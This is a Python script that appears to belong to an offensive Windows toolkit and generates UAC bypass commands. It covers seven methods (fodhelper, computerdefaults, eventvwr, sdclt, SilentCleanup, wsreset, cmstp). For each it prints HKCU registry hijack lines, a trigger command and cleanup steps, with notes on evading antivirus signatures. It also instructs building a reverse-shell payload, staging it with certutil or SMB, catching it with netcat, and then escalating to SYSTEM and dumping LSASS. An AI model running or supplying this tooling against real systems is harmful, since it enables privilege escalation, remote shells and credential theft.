#!/usr/bin/env python3
"""UAC BYPASS family — medium-integrity local admin -> HIGH integrity (full SYSTEM-capable admin).

NOT a privesc from a standard user: it only helps when you ALREADY hold a token in the local
Administrators group but it's filtered by UAC (medium integrity) — e.g. after add_admin, or an
RDP/PSRemoting admin session. Each method hijacks a per-user (HKCU, no admin needed to write)
registry key that a Microsoft AUTO-ELEVATING trusted binary reads, then launches that binary so
it runs YOUR payload high-integrity. All fileless registry hijacks (except cmstp).

Build the payload once (reuses the kit's exe factory), then pick a method:
  python3 gen_payload.py exe --action revshell   ->  x86_64-w64-mingw32-gcc -o payload.exe payload.c

PRINTS the reg-hijack + trigger + cleanup. Edit LHOST/LPORT in _winpriv_common.py.

Usage:
  python3 gen_uac.py [--method fodhelper|computerdefaults|eventvwr|sdclt|silentcleanup|wsreset|cmstp] [--payload C:\\Windows\\Temp\\payload.exe]
  python3 gen_uac.py list
"""
import sys
import _winpriv_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

PAY = opt("--payload", f"{P.STAGE}\\payload.exe")

# each: (trusted auto-elevating exe, [reg hijack lines], trigger, [cleanup lines], note)
METHODS = {
    "fodhelper": {
        "elev": "fodhelper.exe", "trig": "fodhelper.exe",
        "reg": [r'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "{PAY}" /f',
                r'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f'],
        "clean": [r'reg delete "HKCU\Software\Classes\ms-settings" /f'],
        "note": "the classic; ms-settings protocol handler. Works Win10/11 unless AV signatures the key.",
    },
    "computerdefaults": {
        "elev": "computerdefaults.exe", "trig": "computerdefaults.exe",
        "reg": [r'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "{PAY}" /f',
                r'reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /f'],
        "clean": [r'reg delete "HKCU\Software\Classes\ms-settings" /f'],
        "note": "same ms-settings hijack as fodhelper, different trigger exe — use if fodhelper is watched.",
    },
    "eventvwr": {
        "elev": "eventvwr.exe", "trig": "eventvwr.exe",
        "reg": [r'reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /d "{PAY}" /f'],
        "clean": [r'reg delete "HKCU\Software\Classes\mscfile" /f'],
        "note": "mscfile handler. Patched ~Win10 1809 but still lands on many builds/servers.",
    },
    "sdclt": {
        "elev": "sdclt.exe", "trig": "sdclt.exe",
        "reg": [r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "{PAY}" /f'],
        "clean": [r'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f'],
        "note": "sdclt spawns control.exe via App Paths -> your payload. Win10.",
    },
    "silentcleanup": {
        "elev": "schtasks (SilentCleanup)", "trig": r'schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I',
        "reg": [r'reg add "HKCU\Environment" /v windir /d "cmd /c {PAY} &REM " /f'],
        "clean": [r'reg delete "HKCU\Environment" /v windir /f'],
        "note": "abuses %windir% expansion in an auto-elevated scheduled task. Often fires even at low UAC prompt levels.",
    },
    "wsreset": {
        "elev": "wsreset.exe", "trig": "wsreset.exe",
        "reg": [r'reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /ve /d "{PAY}" /f',
                r'reg add "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" /v DelegateExecute /f'],
        "clean": [r'reg delete "HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2" /f'],
        "note": "Win10/11 Store-reset handler. Good when the ms-settings keys are signatured.",
    },
    "cmstp": {
        "elev": "cmstp.exe (INF)", "trig": r'cmstp.exe /au C:\Windows\Temp\x.inf',
        "reg": [],
        "clean": [r'del C:\Windows\Temp\x.inf'],
        "note": "NOT a reg hijack — needs a crafted .inf whose RunPreSetupCommands runs your cmd via the elevated ICMLuaUtil COM. Supply the INF (see the Msitools/UACME template).",
    },
}

arg = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else opt("--method", "fodhelper")

if arg == "list":
    print("# UAC bypass methods (medium-integrity admin -> high integrity). Build payload.exe first (gen_payload.py exe).\n")
    for k, m in METHODS.items():
        print(f"  {k:<16} via {m['elev']:<26} {m['note']}")
    print("\n# run one:  python3 gen_uac.py --method <name>  [--payload C:\\path\\payload.exe]")
    sys.exit(0)

if arg not in METHODS:
    print(f"unknown method '{arg}'. use: list | {' | '.join(METHODS)}"); sys.exit(1)

m = METHODS[arg]
print(f"# UAC BYPASS: {arg}   (auto-elevating trusted binary: {m['elev']})")
print(f"# PRECONDITION: you're in the local Administrators group but medium-integrity (whoami /groups shows the group;")
print(f"#               `whoami /priv` is SHORT / no SeDebug = filtered token). If you're a STANDARD user, this won't help.\n")
print(f"# 0) build + place the payload (high-integrity target of the hijack):")
print(f"#    python3 gen_payload.py exe --action revshell   ->  compile  ->  drop at {PAY} (certutil/SMB)\n")
if m["reg"]:
    print(f"# 1) hijack the per-user key (HKCU — no admin write needed):")
    for line in m["reg"]:
        print(line.replace("{PAY}", PAY))
else:
    print(f"# 1) (no registry hijack — see note) supply the .inf, then:")
print(f"\n# 2) trigger the auto-elevating binary — it runs {PAY} HIGH-integrity:")
print(m["trig"])
print(f"\n# 3) cleanup the hijack:")
for line in m["clean"]:
    print(line)
print(f"\n# note: {m['note']}")
print(f"# if action=revshell:  nc -lvnp {P.LPORT} on the attacker first (you'll get a HIGH-integrity shell).")
print(f"# from high integrity you can then go full SYSTEM (psexec -s, or a service), dump LSASS, etc.")
